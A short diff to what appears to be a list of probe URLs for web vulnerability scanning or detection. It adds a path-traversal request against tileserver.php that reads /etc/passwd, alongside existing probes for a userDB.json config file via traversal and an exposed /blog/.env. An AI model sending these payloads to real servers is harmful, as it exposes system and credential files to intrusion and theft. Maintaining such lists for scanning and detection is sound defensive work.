@@ -37,3 +37,4 @@
 /logs/downloadMainLog?fname=../../../../../../..///config/MPXnode/www/appConfig/userDB.json
 /installed_emanual_list.html
 /blog/.env
+/tileserver.php/x/1/1/1?Format=/../../../../../../../../../../../../../../etc/passwd&Request=x&layer=.
